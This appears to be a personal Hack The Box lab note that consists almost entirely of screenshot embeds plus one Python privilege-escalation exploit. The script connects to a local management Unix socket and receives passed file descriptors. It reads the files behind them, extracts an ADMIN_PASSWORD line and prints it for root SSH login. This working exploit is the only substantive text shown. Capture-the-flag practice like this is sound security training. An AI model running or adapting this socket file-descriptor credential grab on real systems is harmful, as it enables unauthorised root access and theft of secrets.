

# #HTB 


![[Pasted image 20260813131442.png]]



![[Pasted image 20260813131459.png]]



![[Pasted image 20260813131517.png]]




![[Pasted image 20260813131529.png]]



![[Pasted image 20260813131541.png]]



![[Pasted image 20260813134706.png]]



![[Pasted image 20260813134649.png]]



![[Pasted image 20260813134638.png]]


![[Pasted image 20260813134558.png]]



![[Pasted image 20260813134543.png]]




![[Pasted image 20260813185916.png]]


```python
#!/usr/bin/env python3
import socket
import array
import os

def main():
    try:
        print("[+] Connecting to management socket...")
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect("/run/paperwork/mgmt.sock")
        print("[+] Connected successfully!")
        
        print("[+] Receiving file descriptors...")
        msg, ancdata, flags, addr = s.recvmsg(4096, socket.CMSG_LEN(2 * 4))
        print(f"[+] Message: {msg}")
        
        fds = array.array('i')
        for level, type_, data in ancdata:
            if level == socket.SOL_SOCKET and type_ == socket.SCM_RIGHTS:
                fds.frombytes(data[:len(data) - (len(data) % fds.itemsize)])
        
        if not fds:
            print("[-] No file descriptors received!")
            return
            
        print(f"[+] Received {len(fds)} file descriptors: {list(fds)}")
        
        for fd in fds:
            try:
                content = os.pread(fd, 4096, 0)
                decoded = content.decode('utf-8', errors='ignore')
                
                print(f"\n[+] File Descriptor {fd} Content:")
                print("=" * 60)
                print(decoded)
                print("=" * 60)
                
                if "ADMIN_PASSWORD" in decoded:
                    for line in decoded.split('\n'):
                        if "ADMIN_PASSWORD" in line:
                            password = line.split('=')[1].strip()
                            print(f"\n[!] 🔑 PASSWORD FOUND: {password}")
                            print("[!] Save this password for root SSH login!")
                            
            except Exception as e:
                print(f"[-] Error reading fd {fd}: {e}")
        
        s.close()
        print("\n[+] Exploit completed!")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    main()
```



![[Pasted image 20260813185936.png]]



![[Pasted image 20260813190049.png]]



![[Pasted image 20260813190104.png]]



![[Pasted image 20260813190142.png]]


